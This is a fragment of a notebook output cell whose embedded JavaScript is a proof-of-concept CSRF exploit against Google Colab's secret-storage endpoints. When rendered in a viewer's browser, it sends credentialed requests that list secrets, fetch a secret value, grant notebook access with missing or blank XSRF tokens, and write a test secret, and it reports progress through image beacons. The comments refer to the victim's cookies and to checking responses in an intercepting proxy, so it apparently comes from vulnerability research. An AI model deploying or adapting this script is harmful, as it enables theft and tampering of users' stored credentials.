            "application/javascript": "\n(async function poc57() {\n  var BASE = 'https://colab.research.google.com/__poc57';\n  var NB   = 'YOUR_NOTEBOOK_FILE_ID_HERE';\n  var KEY  = 'CSRF_TEST_KEY';\n\n  function B(tag, val) {\n    new Image().src = BASE + '/' + tag +\n      (val !== undefined ? '?d=' + encodeURIComponent(String(val).slice(0,400)) : '');\n  }\n\n  B('start');\n\n  // \u2500\u2500 TEST 1: GET /userdata/list (no XSRF needed for GET) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // mode:'no-cors' so it always completes. Caido sees: HTTP status + body.\n  // If status 200 \u2192 server processed it with victim's cookies.\n  // We can't read the body in JS, but Caido can.\n  try {\n    await fetch('https://colab.research.google.com/userdata/list', {\n      method: 'GET',\n      credentials: 'include',\n      mode: 'no-cors'\n    });\n    B('get-list-sent');\n  } catch(e) { B('get-list-err', e.message); }\n\n  // \u2500\u2500 TEST 2: GET /userdata/get (no XSRF, just needs valid notebookid grant) \u2500\n  // If attacker already has a grant, this returns the secret value.\n  // Caido captures the response body with the secret value if granted.\n  try {\n    await fetch(\n      'https://colab.research.google.com/userdata/get?authuser=0' +\n      '&notebookid=' + encodeURIComponent(NB) +\n      '&key=' + encodeURIComponent(KEY),\n      { method: 'GET', credentials: 'include', mode: 'no-cors' }\n    );\n    B('get-secret-sent');\n  } catch(e) { B('get-secret-err', e.message); }\n\n  // \u2500\u2500 TEST 3: POST /userdata/grant \u2014 NO X-Goog-Colab-Token \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // FormData = simple content type \u2192 no CORS preflight.\n  // Browser sends with victim cookies. X-Goog-Colab-Token is ABSENT.\n  // Caido: check HTTP status. 200 = CSRF works. 4xx = XSRF protection holds.\n  try {\n    var fd1 = new FormData();\n    fd1.append('key', KEY);\n    fd1.append('notebookid', NB);\n    await fetch('https://colab.research.google.com/userdata/grant', {\n      method: 'POST',\n      credentials: 'include',\n      mode: 'no-cors',\n      body: fd1\n    });\n    B('post-grant-sent');\n  } catch(e) { B('post-grant-err', e.message); }\n\n  // \u2500\u2500 TEST 4: POST /userdata/grant \u2014 with a GUESSED/BLANK token \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // Some XSRF implementations accept a blank or replayed token.\n  // We can't set X-Goog-Colab-Token (custom header \u2192 would need preflight),\n  // but we CAN try including it as a form field (maybe server reads body too?).\n  try {\n    var fd2 = new FormData();\n    fd2.append('key', KEY);\n    fd2.append('notebookid', NB);\n    fd2.append('token', '');           // blank token in body\n    fd2.append('xsrf_token', '');      // common alternative field names\n    fd2.append('csrf_token', '');\n    await fetch('https://colab.research.google.com/userdata/grant', {\n      method: 'POST',\n      credentials: 'include',\n      mode: 'no-cors',\n      body: fd2\n    });\n    B('post-grant-blank-token-sent');\n  } catch(e) { B('post-grant-blank-token-err', e.message); }\n\n  // \u2500\u2500 TEST 5: POST /userdata/set \u2014 write a secret value \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // If server accepts without XSRF: attacker can write arbitrary secrets.\n  // Caido: 200 = CSRF on set works (high impact: overwrites victim's secrets).\n  try {\n    var fd3 = new FormData();\n    fd3.append('key', 'CSRF_WRITE_TEST');\n    fd3.append('payload', 'csrf_confirmed_by_poc57');\n    await fetch('https://colab.research.google.com/userdata/set', {\n      method: 'POST',\n      credentials: 'include',\n      mode: 'no-cors',\n      body: fd3\n    });\n    B('post-set-sent');\n  } catch(e) { B('post-set-err', e.message); }\n\n  B('done');\n})();\n",
            "text/plain": [
